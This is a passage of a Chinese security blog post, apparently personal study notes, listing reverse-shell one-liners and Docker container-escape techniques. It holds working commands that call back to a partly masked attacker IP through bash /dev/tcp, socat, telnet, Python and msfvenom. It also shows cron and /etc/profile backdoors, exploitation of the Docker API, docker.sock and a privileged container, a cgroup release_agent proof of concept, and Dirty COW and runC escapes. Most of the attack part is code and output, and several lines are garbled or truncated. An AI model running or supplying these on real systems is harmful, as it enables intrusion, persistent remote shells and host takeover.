class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"number\">47.</span>xxx.<span class=\"property\">xxx</span><span class=\"number\">.72</span>|bash</span><br></pre></td></tr></table></figure>\n<p><strong>4. 将反弹 shell 的命令写入定时任务</strong></p>\n<p>我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹 shell 命令是要写在  <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code>  内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span><br><span class=\"line\">*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p><strong>5. 将反弹 shell 的命令写入 /etc/profile 文件</strong></p>\n<p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;  # 最后面那个&amp;为的是防止管理员无法输入命令</span><br></pre></td></tr></table></figure>\n<p><strong>6. 利用 Socat 反弹 shell</strong></p>\n<p>Socat 是 Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于 socket 的，其功能与 netcat 类似，不过据说可以看做 netcat 的加强版</p>\n<p>攻击机开启本地监听：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat <span class=\"variable constant_\">TCP</span>-<span class=\"attr\">LISTEN</span>:<span class=\"number\">2333</span> -或nc -lvvp <span class=\"number\">2333</span></span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机 **：**</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socat tcp-<span class=\"attr\">connect</span>:<span class=\"number\">47.</span>xxx.<span class=\"property\">xxx</span><span class=\"number\">.72</span>:<span class=\"number\">2333</span> <span class=\"attr\">exec</span>:<span class=\"string\">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure>\n<p><strong>7. 利用 Telnet 反弹 shell</strong></p>\n<p>攻击机开启本地监听：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp <span class=\"number\">2333</span></span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机 **：**</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mknod a p; telnet <span class=\"number\">47.</span>xxx.<span class=\"property\">xxx</span><span class=\"number\">.72</span> <span class=\"number\">2333</span> <span class=\"number\">0</span>&lt;a | <span class=\"regexp\">/bin/</span>bash <span class=\"number\">1</span>&gt;a</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<p>攻击机需要开启两个本地监听 **：**</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 2333nc -lvvp <span class=\"number\">4000</span></span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet <span class=\"number\">47.101</span><span class=\"number\">.57</span><span class=\"number\">.72</span> <span class=\"number\">2333</span> | <span class=\"regexp\">/bin/</span>bash | telnet <span class=\"number\">47.101</span><span class=\"number\">.57</span><span class=\"number\">.72</span> <span class=\"number\">4000</span></span><br></pre></td></tr></table></figure>\n<p>8.<strong>python 反弹 shell</strong></p>\n<p>攻击机开启本地监听：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp <span class=\"number\">2333</span></span><br></pre></td></tr></table></figure>\n<p>目标机主动连接攻击机：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><strong>9. 使用 msf</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xODE4MDkx\">反弹 Shell，看这一篇就够了 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<p>顺便再提一句</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201190805082.png\" alt=\"image-20221201190805082\"></p>\n<p>在 bash 中是如下描述的：</p>\n<blockquote>\n<p><strong>Bash</strong> handles several filenames specially when they are used in redirections, as described in the following table:</p>\n<p><code>/dev/tcp/host/port</code></p>\n<p>If <em>host</em> is a valid hostname or Internet address, and <em>port</em> is an integer port number or service name, <strong>bash</strong> attempts to open a TCP connection to the corresponding socket.</p>\n<p><code>/dev/udp/host/port</code></p>\n<p>If <em>host</em> is a valid hostname or Internet address, and <em>port</em> is an integer port number or service name, <strong>bash</strong> attempts to open a UDP connection to the corresponding socket.</p>\n<p>一些文件名在重定向中被 bash 特殊处理</p>\n<p>如果主机是有效的主机名或 Internet 地址，端口是整数端口号或服务名称，bash 将尝试打开到相应套接字的 TCP/UDP 连接。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5kaWUubmV0L21hbi8xL2Jhc2g=\">bash(1): GNU Bourne-Again SHell - Linux man page (die.net)</span></p>\n<p>这其实是一种 redirection。这意味着即使要创建一个内核 <code>/dev/tcp</code>  工具，shell 也会在 99％的时间内以交互方式屏蔽它。</p>\n</blockquote>\n<p>bash 源码中对 /dev/tcp/ 的处理，截取出 ip、端口，建立 tcp 连接。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201191252436.png\" alt=\"image-20221201191252436\"></p>\n<p><code>/dev/&#123;tcp|udp&#125;/$&#123;host&#125;/$&#123;port&#125;</code>  这个功能只在 bash 中存在，其它的 shell 如 sh、dash、zsh 中是没有的。</p>\n<p><a href=\"https://blog.csdn.net/lyndon_li/article/details/121447208\">(71 条消息) /dev/tcp/<em>/</em>_Li-Yongjun 的博客 - CSDN 博客_dev/tcp</a></p>\n<h2 id=\"docker-逃逸\"><a class=\"markdownIt-Anchor\" href=\"#docker-逃逸\">#</a> docker 逃逸</h2>\n<p>因为 Docker 所使用的是隔离技术，就导致了容器内的进程无法看到外面的进程，但外面的进程可以看到里面，所以如果一个容器可以访问到外面的资源，甚至是获得了宿主主机的权限，这就叫做 “Docker 逃逸”。</p>\n<h3 id=\"1docker-daemon-api未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#1docker-daemon-api未授权访问\">#</a> 1.docker daemon api 未授权访问</h3>\n<p>docker swarm 是管理 docker 集群的工具。主从管理、默认通过 2375 端口通信。绑定了一个 Docker Remote API 的服务，可以通过 HTTP、Python、调用 API 来操作 Docker。</p>\n<p>在使用 docker swarm 的时候，节点上会开放一个 TCP 端口 2375，绑定在 0.0.0.0 上，如果我们使用 HTTP 的方式访问会返回 404</p>\n<p>使用如下方式启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</span><br></pre></td></tr></table></figure>\n<p>在没有其他网络访问限制的主机上使用，则会在公网暴漏端口。</p>\n<p>1. 首先列出所有容器，得到 id 字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://x.x.x.x:2375/containers/json</span><br></pre></td></tr></table></figure>\n<p>2. 创建 exec</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /containers/&lt;container_id&gt;/exec HTTP/1.1</span><br><span class=\"line\">Host: &lt;docker_host&gt;:PORT</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 188</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;AttachStdin&quot;: true,</span><br><span class=\"line\">  &quot;AttachStdout&quot;: true,</span><br><span class=\"line\">  &quot;AttachStderr&quot;: true,</span><br><span class=\"line\">  &quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],</span><br><span class=\"line\">  &quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,</span><br><span class=\"line\">  &quot;Privileged&quot;: true,</span><br><span class=\"line\">  &quot;Tty&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 burp 模拟 post 请求发包，得到返回的 id 参数。</p>\n<p>3、启动 exec, 成功执行了系统命令，读取到了 passwd 文件。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /exec/&lt;exec_id&gt;/start HTTP/1.1</span><br><span class=\"line\">Host: &lt;docker_host&gt;:PORT</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> &quot;Detach&quot;: false,</span><br><span class=\"line\"> &quot;Tty&quot;: false</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果要逃逸到宿主机，利用方法是，我们随意启动一个容器，并将宿主机的 <code>/etc</code>  目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> docker</span><br><span class=\"line\"></span><br><span class=\"line\">client = docker.DockerClient(base_url=<span class=\"string\">&#x27;http://your-ip:2375/&#x27;</span>)</span><br><span class=\"line\">data = client.containers.run(<span class=\"string\">&#x27;alpine:latest&#x27;</span>, <span class=\"string\">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class=\"literal\">True</span>, volumes=&#123;<span class=\"string\">&#x27;/etc&#x27;</span>: &#123;<span class=\"string\">&#x27;bind&#x27;</span>: <span class=\"string\">&#x27;/tmp/etc&#x27;</span>, <span class=\"string\">&#x27;mode&#x27;</span>: <span class=\"string\">&#x27;rw&#x27;</span>&#125;&#125;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"2docker-特权逃逸\"><a class=\"markdownIt-Anchor\" href=\"#2docker-特权逃逸\">#</a> 2.docker 特权逃逸</h3>\n<p>1. 启动特权容器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --privileged ubuntu:18.04  </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@f445bbcea9dd:/# id </span><br><span class=\"line\">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>\n<p>2. 挂载宿主目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fdisk -l</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@f445bbcea9dd:/# fdisk -l</span><br><span class=\"line\">Disk /dev/vda: 50 GiB, 53687091200 bytes, 104857600 sectors</span><br><span class=\"line\">Units: sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\">Disklabel type: dos</span><br><span class=\"line\">Disk identifier: 0x0009ac89</span><br><span class=\"line\"></span><br><span class=\"line\">Device     Boot Start       End   Sectors Size Id Type</span><br><span class=\"line\">/dev/vda1  *     2048 104857566 104855519  50G 83 Linux</span><br><span class=\"line\">root@f445bbcea9dd:/# mkdir /uzju</span><br><span class=\"line\">root@f445bbcea9dd:/# mount /dev/vda1 /uzju/</span><br><span class=\"line\">root@f445bbcea9dd:/# chroot /uzju/</span><br><span class=\"line\">sh-4.2# ls </span><br><span class=\"line\">1.sh\t  CronText    c-jwt-cracker  clash\t    docker-file  haha.py\tmsfinstall  vendor</span><br><span class=\"line\">Arjun\t  DS_Store    check.py\t     composer.json  etcbackup\t install.sh\tplus.c</span><br><span class=\"line\">sh-4.2# cat /etc/passwd</span><br><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">guest:x:0:0:guest:/home/guest:/bin/bash</span><br><span class=\"line\">bin:x:1:1:bin:/bin:/sbin/nologin</span><br></pre></td></tr></table></figure>\n<h3 id=\"3挂载dockersock\"><a class=\"markdownIt-Anchor\" href=\"#3挂载dockersock\">#</a> 3. 挂载 docker.sock</h3>\n<p>/var/run/docker.sock 是 Docker 守护程序默认监听的 Unix 套接字。它也是一个用于从容器内与 Docker 守护进程通信的工具 Unix Sockets 术语套接字通常是指 IP 套接字。这些是绑定到端口（和地址）的端口，我们向其发送 TCP 请求并从中获取响应。</p>\n<p>另一种类型的 Socket 是 Unix Socket，这些套接字用于 IPC（进程间通信）。它们也称为 Unix 域套接字 (UDS)。Unix 套接字使用本地文件系统进行通信，而 IP 套接字使用网络。</p>\n<p>Docker 守护进程可以通过三种不同类型的 Socket 监听 Docker Engine API 请求：unix, tcp, and fd. 默认情况下，在 /var/run/docker.sock 中创建一个 unix 域套接字（或 IPC 套接字）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、unix:///var/run/docker.sock</span><br><span class=\"line\">2、tcp://host:port</span><br><span class=\"line\">3、fd://socketfd</span><br></pre></td></tr></table></figure>\n<p>其中使用 docker.sock 进行通信为默认方式，当容器中进程需在生产过程中与 Docker 守护进程通信时，容器本身需要挂载 /var/run/docker.sock 文件。<br>\n本质上而言，能够访问 docker socket 或连接 HTTPS API 的进程可以执行 Docker 服务能够运行的任意命令，以 root 权限运行的 Docker 服务通常可以访问整个主机系统。<br>\n因此，当容器访问 docker socket 时，我们可通过与 docker daemon 的通信对其进行恶意操纵完成逃逸。若容器 A 可以访问 docker socket，我们便可在其内部安装 client（docker），通过 docker.sock 与宿主机的 server（docker daemon）进行交互，运行并切换至不安全的容器 B，最终在容器 B 中控制宿主机。</p>\n<p>创建 docker, 挂载 /var/run/ 的容器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04  </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@381fa7cedc40:/var/run# ls -al</span><br><span class=\"line\">total 20</span><br><span class=\"line\">drwxr-xr-x 1 root root 4096 Nov 28 02:08 .</span><br><span class=\"line\">drwxr-xr-x 1 root root 4096 Nov 28 02:17 ..</span><br><span class=\"line\">srw-rw---- 1 root  992    0 Apr 17  2022 docker.sock</span><br><span class=\"line\">drwxrwxrwt 2 root root 4096 Sep 30  2021 lock</span><br><span class=\"line\">drwxr-xr-x 2 root root 4096 Sep 30  2021 mount</span><br><span class=\"line\">drwxr-xr-x 2 root root 4096 Sep 30  2021 systemd</span><br><span class=\"line\">-rw-rw-r-- 1 root utmp    0 Sep 30  2021 utmp</span><br></pre></td></tr></table></figure>\n<p>查看宿主机 docker 信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -H unix:///host/var/run/docker.sock info</span><br></pre></td></tr></table></figure>\n<p>运行一个新容器并挂载宿主机根路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:18.04 /bin/bash </span><br><span class=\"line\">chroot /aa</span><br></pre></td></tr></table></figure>\n<p>在新容器 /aa 路径下完成对宿主机资源的访问</p>\n<p>写入计划任务文件，反弹 shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9988 0&gt;&amp;1&#x27; &gt;&gt; /nuoyan/var/spool/cron/root </span><br></pre></td></tr></table></figure>\n<h3 id=\"4挂载宿主机根目录\"><a class=\"markdownIt-Anchor\" href=\"#4挂载宿主机根目录\">#</a> 4. 挂载宿主机根目录</h3>\n<p>如果在 docker 启动的时候挂载了宿主机的根目录，就可以通过 chroot 获取宿主机的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it -v /:/uzju/ ubuntu:18.04 </span><br><span class=\"line\">chroot /uzju/  </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh-4.2# ls </span><br><span class=\"line\">1.sh\t  CronText    c-jwt-cracker  clash\t    docker-file  haha.py\tmsfinstall  vendor</span><br><span class=\"line\">Arjun\t  DS_Store    check.py\t     composer.json  etcbackup\t install.sh\tplus.c</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>反弹 shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.139/ &gt;&amp;  </span><br></pre></td></tr></table></figure>\n<h3 id=\"5-cgroup执行宿主机系统命令\"><a class=\"markdownIt-Anchor\" href=\"#5-cgroup执行宿主机系统命令\">#</a> 5、Cgroup 执行宿主机系统命令</h3>\n<p>通过 notify_on_release 实现容器逃逸条件</p>\n<ul>\n<li>以 root 用户身份在容器内运行</li>\n<li>使用 SYS_ADMINLinux 功能运行</li>\n<li>缺少 AppArmor 配置文件，否则将允许 mountsyscall</li>\n<li>cgroup v1 虚拟文件系统必须以读写方式安装在容器内</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04  </span><br></pre></td></tr></table></figure>\n<p>POC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># In the container </span><br><span class=\"line\"># 挂载宿主机cgroup，自定义一个cgroup，/tmp/cgrp/x </span><br><span class=\"line\">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x </span><br><span class=\"line\"># 设置/tmp/cgrp/x的cgroup的notify_no_release和release_agent </span><br><span class=\"line\">#  设置/tmp/cgrp/x的notify_no_release属性设置为1，通过sed匹配出/etc/mtab中perdir=的路径,然后将路径+cmd写入/tmp/cgrp/release_agent </span><br><span class=\"line\">echo 1 &gt; /tmp/cgrp/x/notify_on_release </span><br><span class=\"line\">host_path=`sed -n &#x27;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#x27; /etc/mtab` </span><br><span class=\"line\">echo &quot;$host_path/cmd&quot; &gt; /tmp/cgrp/release_agent </span><br><span class=\"line\"># 写入自定义命令 </span><br><span class=\"line\">echo &#x27;#!/bin/sh&#x27; &gt; /cmd </span><br><span class=\"line\"># 结果在当前目录的output文件中 </span><br><span class=\"line\">echo &quot;ls -al /root &gt; $host_path/output&quot; &gt;&gt; /cmd </span><br><span class=\"line\">chmod a+x /cmd </span><br><span class=\"line\"># 执行完sh -c之后，sh进程自动退出，cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release_agent文件里的shell将被操作系统内核执行,达到了容器逃逸的效果 </span><br><span class=\"line\">sh -c &quot;echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs&quot; </span><br></pre></td></tr></table></figure>\n<p>cat output</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@6c9a389c4fa2:/# cat output </span><br><span class=\"line\">total 44688</span><br><span class=\"line\">dr-xr-x---. 24 root       root           4096 Nov 27 11:01 .</span><br><span class=\"line\">dr-xr-xr-x. 24 root       root           4096 Nov 28 10:44 ..</span><br><span class=\"line\">-rwxrwxrwx   1 root       root           1460 Apr  4  2022 1.sh</span><br><span class=\"line\">drwxr-xr-x   3 root       root           4096 May 16  2022 Arjun</span><br><span class=\"line\">drwxr-xr-x   5 root       root           4096 Oct 31 14:19 CS4.4</span><br><span class=\"line\">-rw-r--r--   1 root       root         320279 Nov 27 11:00 Cron.txt</span><br><span class=\"line\">-rw-r--r--   1 root       root       44937808 Nov 28 10:40 CronText</span><br><span class=\"line\">-rw-r--r--   1 root       root           8196 May 29  2022 DS_Store</span><br><span class=\"line\">-rw-r--r--   1 root       root            284 Sep  4 12:27 Dockerfile</span><br><span class=\"line\">drwxr-xr-x   3 root       root           4096 Sep  4 22:50 book</span><br><span class=\"line\">drwxr-xr-x   3 root       root           4096 May  6  2022 c-jwt-cracker</span><br><span class=\"line\">-rw-r--r--   1 root       root          18856 Dec 28  2021 check.py</span><br><span class=\"line\">-rw-r--r--   1 root       root          16999 Dec 28  2021 check1.py</span><br></pre></td></tr></table></figure>\n<p>剩下还有一堆我复现不了的逃逸方法，仅在此做记录，不代表具有真实可行性</p>\n<h3 id=\"6dirty-cow-漏洞逃逸\"><a class=\"markdownIt-Anchor\" href=\"#6dirty-cow-漏洞逃逸\">#</a> 6.Dirty Cow 漏洞逃逸</h3>\n<p>Dirty Cow（CVE-2016-5195）是 Linux 内核中的权限提升漏洞，源于 Linux 内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。</p>\n<p>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得 root 权限。VDSO 就是 Virtual Dynamic Shared Object（虚拟动态共享对象），<span class=\"exturl\" data-url=\"aHR0cDovL3huLS12c3E4OWJsNGJqNTJhbjhhbXpvYzQxYXc5MWEuc28=\">即内核提供的虚拟.so</span>。该.so 文件位于内核而非磁盘，程序启动时，内核把包含某.so 的内存页映射入其内存空间，对应程序就可作为普通.so 使用其中的函数。</p>\n<p>在容器中利用 VDSO 内存空间中的 “clock_gettime () ” 函数可对脏牛漏洞发起攻击，令系统崩溃并获得 root 权限的 shell，且浏览容器之外主机上的文件。</p>\n<p>centos 下自动安装 docker 环境</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh  </span><br></pre></td></tr></table></figure>\n<p>1. 运行漏洞 exp</p>\n<p>下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmdpdGh1Yi5jb20lMkZzY3VtanIlMkZkaXJ0eWNvdy12ZHNv\">https://github.com/scumjr/dirtycow-vdso</span></p>\n<p>2. 编译</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /dirtycow-vdso/    //进入dirtycow-vdso文件夹</span><br><span class=\"line\">make       //使用make命令编译.c文件</span><br><span class=\"line\">./0xdeadbeef     //运行0xdeadbeef 文件</span><br></pre></td></tr></table></figure>\n<p>显示 successfully 表示成功。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1594194364.png!small\" alt=\"img\"></p>\n<p>成功获取到宿主机的 shell。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1594194403.png!small\" alt=\"img\"></p>\n<h3 id=\"7runc逃逸-cve-2019-5736\"><a class=\"markdownIt-Anchor\" href=\"#7runc逃逸-cve-2019-5736\">#</a> 7.runC 逃逸 - CVE-2019-5736</h3>\n<p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl <span class=\"attr\">https</span>:<span class=\"comment\">//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o i</span></span><br></pre></td></tr></table></figure>\n<p>Docker、containerd 